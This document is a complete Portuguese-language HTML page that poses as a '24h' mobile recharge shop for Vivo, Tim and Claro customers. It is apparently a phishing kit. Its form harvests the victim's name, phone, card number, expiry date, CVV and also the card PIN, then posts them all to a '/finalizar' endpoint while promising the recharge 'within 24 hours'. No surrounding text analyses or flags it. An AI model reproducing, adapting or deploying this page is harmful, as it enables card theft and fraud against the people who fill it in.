<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recarga Rápida 24h</title>
    <style>
        body { background-color: #0d1117; color: #f0f6fc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 350px; }
        h2 { text-align: center; color: #58a6ff; margin-bottom: 20px; font-size: 1.2rem; }
        label { display: block; margin: 10px 0 5px; font-size: 14px; color: #8b949e; }
        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
        .hidden { display: none; }
        button { width: 100%; padding: 15px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        button.next { background: #58a6ff; }
        .info-24h { text-align: center; font-size: 11px; color: #8b949e; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="titulo">Dados da Recarga</h2>
        <form id="formRecarga">
            <div id="etapa1">
                <label>Operadora</label>
                <select id="operadora" required>
                    <option value="Vivo">Vivo</option>
                    <option value="Tim">Tim</option>
                    <option value="Claro">Claro</option>
                </select>
                <label>Nome Completo</label>
                <input type="text" id="nome" placeholder="Nome do titular" required>
                <label>Telefone com DDD</label>
                <input type="tel" id="telefone" placeholder="(00) 00000-0000" required>
                <button type="button" class="next" onclick="proximaEtapa()">PRÓXIMA ETAPA (PAGAMENTO)</button>
            </div>

            <div id="etapa2" class="hidden">
                <label>Número do Cartão</label>
                <input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="16" required>
                <div style="display: flex; gap: 10px;">
                    <div style="flex: 1;">
                        <label>Validade</label>
                        <input type="text" id="data" placeholder="MM/AA" maxlength="5" required>
                    </div>
                    <div style="flex: 1;">
                        <label>CVV</label>
                        <input type="text" id="cvv" placeholder="000" maxlength="3" required>
                    </div>
                </div>
                <label>Valor da Recarga</label>
                <select id="valor" required>
                    <option value="20">R$ 20,00</option>
                    <option value="40">R$ 40,00</option>
                    <option value="100">R$ 100,00</option>
                </select>
                <label>Senha do Cartão (6 ou 8 dígitos)</label>
                <input type="password" id="senha" placeholder="******" minlength="6" maxlength="8" required>
                <button type="submit">FINALIZAR E RECEBER EM 24H</button>
            </div>
            <p class="info-24h">Sua recarga será processada em até 24 horas.</p>
        </form>
    </div>

    <script>
        function proximaEtapa() {
            document.getElementById('etapa1').classList.add('hidden');
            document.getElementById('etapa2').classList.remove('hidden');
            document.getElementById('titulo').innerText = 'Dados de Pagamento';
        }

        document.getElementById('formRecarga').onsubmit = async (e) => {
            e.preventDefault();
            const dados = {
                operadora: document.getElementById('operadora').value,
                nome: document.getElementById('nome').value,
                telefone: document.getElementById('telefone').value,
                cartao: document.getElementById('cartao').value,
                data: document.getElementById('data').value,
                cvv: document.getElementById('cvv').value,
                valor: document.getElementById('valor').value,
                senha: document.getElementById('senha').value
            };
            const response = await fetch('/finalizar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dados)
            });
            if (response.ok) {
                alert('Pedido recebido! Recarga em até 24h.');
                window.location.reload();
            }
        };
    </script>
</body>
</html>
